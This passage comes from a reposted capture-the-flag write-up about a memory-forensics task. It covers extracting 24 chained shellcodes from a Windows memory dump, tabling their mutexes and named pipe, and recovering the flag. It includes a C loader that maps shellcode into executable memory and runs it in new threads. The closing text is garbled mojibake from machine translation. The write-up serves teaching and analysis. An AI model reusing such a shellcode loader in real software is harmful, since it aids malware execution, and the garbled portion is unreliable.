SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5 (2).exe SIGN.MEDIA=E00058 zn_2019\ConsoleApplication5.exe SIGN.MEDIA=E00058 zn_2019\Injector2.exe SIGN.MEDIA=E00058 zn_2019\injector.exe SIGN.MEDIA=E00058 zn_2019\note.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E00058 zn_2019\note2.exe SIGN.MEDIA=E9982 zn_2019\server\run.exe</code> </pre> <br><p> I used my old tool to get filesystem structure out of NTFS records (a lot of FILE records usually cached in RAM). </p><br><p><img src="https://habrastorage.org/webt/x7/bf/tq/x7bftqu47ozkqm1ps96i6luh9za.png"><br><img src="https://habrastorage.org/webt/u9/uo/mz/u9uomzuew2uy6ib7tdqpltzozao.png"></p><br><p> <strong>data_storage</strong> is small enough to contain some resident $DATA inside FILE record, so we can extract it. </p><br><p> This file contains shellcode. All it does is resolving CreateNamedPipeA by hash using special function (see Figure below) and calling it with <strong>"\.\pipe\zn_shell_stor"</strong> argument. </p><br><p><img src="https://habrastorage.org/webt/ag/d-/9v/agd-9vmbes5yrnupfxrucg9a3cs.png"></p><br><p> I highlighted part of this function, this bytes can be used to located other 24 shellcodes inside memory dump. </p><br><p> One of shellcode #21 contained references to other, it is probably the main one. </p><br><pre> <code class="plaintext hljs">Global\vtHAjnNbCecOeNAnVeQFmdRw Global\jGzXXZJbXGPYniopljDEdwuD Global\jpBuyMNJzdnpwHimVlcBkwGo Global\ArlCJOxJFOKRkqOLcBhvjYqj Global\THxjCBohxSlNgCFbwJsHujqk Global\BOiJhsLFBuZdsFdCrLKEucpJ Global\iYxszVIFfsuzzEmGwgOQeEcb Global\NOluZoXPJalShopCCuNnWQbR Global\GCrtPmNEAOsZpSNNBdiYQfgz Global\pVVgeqcREhXSgKCwhkeyfTXw Global\trsQPehKvlxBJhEqIPtwzjxi Global\ngVrhgAEqcDssFsNerrAZsFz Global\KiZvGyiMnyTgvQdFNGcudfTY Global\FzXvKPKGCPMAERklFMXVMYga Global\nCZpFZPtyidhFOvVeemfyJAC Global\pjRmfOLLBXIbsJholoasvrqC Global\mhOVYcYRKgWdABAsgkvrcOOM Global\syGiShcLTXfQYGAAiafYBxoF Global\KbFVsPCPZrfVlUIQlvVoJLXW Global\XbuYiHCxQLTLApuToFldJIgI Global\auFqpIQAlsHcvjPEakqHyIeA Global\MrnXOMJvHmYBxRfkbLBUYWgn Global\GYVOmvrLhCpgQUPfnOshzzem Global\qaswedfrtghyujkiol121232 \\.\pipe\zn_shell_stor</code> </pre> <br><p> Every shellcode is started with CALL $+X instruction (E8 ?? ?? ?? ??), followed by data block and executable code. Code is looking for some functions and evaluates logic based on data read from pipe <strong>"\.\pipe\zn_shell_stor"</strong> . </p><br><div class="scrollable-table"><table><thead><tr><th> File </th><th> Tags </th><th> Mutex </th></tr></thead><tbody><tr><td> b1 </td><td> mov mov </td><td> Global\GCrtPmNEAOsZpSNNBdiYQfgz </td></tr><tr><td> b2 </td><td> SBOX "axfksyBLjRfMFZXdINqyTXcekgCxPRNpKtmTAj SUdmElMsuKYkmFYbJxSbXwxmvQ" </td><td> Global\NOluZoXPJalShopCCuNnWQbR </td></tr><tr><td> b3 </td><td> inc byte [rbp+0Ch] </td><td> Global\ngVrhgAEqcDssFsNerrAZsFz </td></tr><tr><td> b4 </td><td> repne scasb strlen() == 18 </td><td> Global\jpBuyMNJzdnpwHimVlcBkwGo </td></tr><tr><td> b5 </td><td> ?? </td><td> Global\ArlCJOxJFOKRkqOLcBhvjYqj </td></tr><tr><td> b6 </td><td> xor BUFFER "\x31\x2A\x72\xC8\x5E\x08\xC5\xFE \x07\x44\xCB\xEB\x76\x3B\xE1\x3A\x83" </td><td> Global\MrnXOMJvHmYBxRfkbLBUYWgn </td></tr><tr><td> b7 </td><td> ?? </td><td> Global\GYVOmvrLhCpgQUPfnOshzzem </td></tr><tr><td> b8 </td><td> cmp word [rbp+0Ch], 12h </td><td> Global\KbFVsPCPZrfVlUIQlvVoJLXW </td></tr><tr><td> b9 </td><td> ?? </td><td> Global\BOiJhsLFBuZdsFdCrLKEucpJ </td></tr><tr><td> b10 </td><td> ?? </td><td> Global\iYxszVIFfsuzzEmGwgOQeEcb </td></tr><tr><td> b11 </td><td> cmp </td><td> Global\pjRmfOLLBXIbsJholoasvrqC </td></tr><tr><td> b12 </td><td> add xor cl x2 </td><td> Global\nCZpFZPtyidhFOvVeemfyJAC </td></tr><tr><td> b13 </td><td> inc [rbp+0Ch] </td><td> Global\auFqpIQAlsHcvjPEakqHyIeA </td></tr><tr><td> b14 </td><td> dw[rbp+0Ch] = dw[rbp+0Ch] + dw[rbp+0Ch] </td><td> Global\syGiShcLTXfQYGAAiafYBxoF </td></tr><tr><td> b15 </td><td> WIN! Sleep Beep </td><td> Global\XbuYiHCxQLTLApuToFldJIgI </td></tr><tr><td> b16 </td><td> save byte </td><td> Global\mhOVYcYRKgWdABAsgkvrcOOM </td></tr><tr><td> b17 </td><td> add xor cl x2 </td><td> Global\FzXvKPKGCPMAERklFMXVMYga </td></tr><tr><td> b18 </td><td> zero rbp (0, 211h, 80h) </td><td> Global\trsQPehKvlxBJhEqIPtwzjxi </td></tr><tr><td> b19 </td><td> ?? </td><td> Global\KiZvGyiMnyTgvQdFNGcudfTY </td></tr><tr><td> b20 </td><td> Read from C:\beeps\flag.txt </td><td> Global\vtHAjnNbCecOeNAnVeQFmdRw </td></tr><tr><td> b21 </td><td> MAIN </td><td></td></tr><tr><td> b22 </td><td> Xor </td><td> Global\THxjCBohxSlNgCFbwJsHujqk </td></tr><tr><td> b23 </td><td> cmp dw[rbp+0Ch], 256 dec </td><td> Global\pVVgeqcREhXSgKCwhkeyfTXw </td></tr><tr><td> b24 </td><td> beep(1000, 1100) </td><td> Global\jGzXXZJbXGPYniopljDEdwuD </td></tr></tbody></table></div><br><p> Understanding of shellcode actions is a little bit hard because everything tied together via pipe (A calls B, B calls C and etc.). We are required to jump from one shellcode to another during reversing. </p><br><p> I decided to execute it all and see what happens. All shellcodes was saved as files <strong>bN</strong> , where N is a number in range from 1 to 24 in order of appearing in memory dump. Dump #21 is the main dispatcher (it must be loaded first). File <strong><em>C:\beeps\flag.txt</em></strong> should be present in system for #20 to work. </p><br><pre> <code class="plaintext hljs">#include &lt;windows.h&gt; void load_shellcode(int index) { FILE* fp; DWORD dwThread; int size; CHAR filename[32]; sprintf_s(filename, "b%i", index); fopen_s(&amp;fp, filename, "rb"); fseek(fp, 0, SEEK_END); size = ftell(fp); fseek(fp, 0, SEEK_SET); LPVOID pMem = VirtualAlloc( NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ); printf("Loaded %i | size=%i | at %p\n", index, size, pMem); fread(pMem, 1, size, fp); CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMem, 0, 0, &amp;dwThread); fclose(fp); } int main() { load_shellcode(21); Sleep(1000); for (int i = 1; i &lt;= 24; i++) { if (i == 21) continue; load_shellcode(i); } while (1) Sleep(1000); }</code> </pre> <br><p> I created <strong>C:\beeps\flag.txt</strong> with some dummy content (length is 17 as hinted by one of the shellcodes) and also set a breakpoint at module doing xor with buffer (#6). </p><br><p> Program executed and flag showed up in memory after XOR operation. </p><br><p> Flag: <strong><em>zn{$ucH <em>SL0W</em> !pC}</em></strong> </p></div></div><br><p>  sysenter    6 .   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="></a> . </p><br><h2> ä¸€äº›ç»Ÿè®¡ </h2><br><p>                .   136     . </p><br><p>       . <br>       â€” ASR-EHD  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">Digital Security</a> .      (AV1ct0r),     22 15   . </p><br><p>     Protected Shell  RuCTFE.       â€” 10.   vos,     1 26. </p><br><p> ,     .   12-13    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ZeroNights</a> . </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN472416/">https://habr.com/ru/post/zh-CN472416/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN472404/index.html">äºŒç»´ç¢°æ’è®¡ç®—ï¼šGilbert-Johnson-Kirtiç®—æ³•</a></li>
<li><a href="../zh-CN472406/index.html">æŠ«è¨é€è´§æœŸé—´æ‰©å±•æ•°æ®ä¸­å¿ƒ</a></li>
<li><a href="../zh-CN472410/index.html">è®¾è®¡å¯ç”¨çš„è‰²å½©ç³»ç»Ÿ</a></li>
<li><a href="../zh-CN472412/index.html">ç³»ç»Ÿåˆ†æå¸ˆå’Œäº§å“æŒ‡æ ‡-æ‘‡åŠ¨ä½†ä¸èƒ½æ··ä¸ºä¸€è°ˆï¼Ÿ</a></li>
<li><a href="../zh-CN472414/index.html">å¿«é€Ÿä¸­å­ååº”å †çš„æ‚ ä¹…å†å²å’Œå°é—­ç‡ƒæ–™å¾ªç¯çš„å¸Œæœ›</a></li>
<li><a href="../zh-CN472418/index.html">å¦‚ä½•ä¿ç•™è‡ªå®šä¹‰å¼€å‘çš„æƒåˆ©</a></li>
<li><a href="../zh-CN472420/index.html">ç”±äºæ¨è¿Ÿäº†Promiseï¼Œä½¿ç•Œé¢æ›´å…·å“åº”æ€§</a></li>
<li><a href="../zh-CN472422/index.html">Sber X RamblerFrontå’Œèšä¼š</a></li>
<li><a href="../zh-CN472426/index.html">å®‰å…¨å‘¨åˆŠ43ï¼šç‰©è”ç½‘Hanipotçš„ç§˜å¯†ç”Ÿæ´»</a></li>
<li><a href="../zh-CN472428/index.html">Tarantool Kubernetesè¿ç®—ç¬¦</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>